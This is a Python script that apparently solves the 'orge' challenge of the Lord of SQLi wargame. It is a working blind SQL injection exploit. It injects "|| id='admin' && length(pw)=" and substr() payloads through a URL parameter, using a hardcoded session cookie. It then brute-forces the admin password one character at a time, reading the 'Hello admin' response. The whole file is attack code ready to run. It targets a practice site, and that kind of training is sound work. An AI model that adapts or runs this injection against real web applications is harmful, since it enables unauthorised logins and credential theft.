from urllib.request import urlopen
import urllib
import requests

flag = ""
length = 0

url = "https://los.rubiya.kr/chall/orge_bad2f25db233a7542be75844e314e9f3.php?pw="
session = dict(PHPSESSID = "ibclqmmhti6htrpjur19eucjdh")

print ("[+] Start")

print ("[+] Find length of the password")

for i in range(0, 20):
	try:
		query = url + "1' || id='admin' %26%26 length(pw)=" + str(i) + "%23"
		r = requests.post(query, cookies=session)
	except:
		print ("[-] Error occur")
		continue

	if 'Hello admin' in r.text:
		length = i
		break

print ("[+] Found length : ", length)

print ("[+] Find password")

for j in range(1, length + 1):
	for i in range(48, 128):
		try:
			query = url + "1' || id='admin' %26%26 substr(pw, " + str(j) + ", 1)='" + chr(i)
			r = requests.post(query, cookies=session)
		except:
			print ("[-] Error occur")
			continue

		if 'Hello admin' in r.text:
			flag += chr(i)
			print ("[+] Found " + str(j), ":", flag)
			break

print ("[+] Found password : ", flag)
print ("[+] End")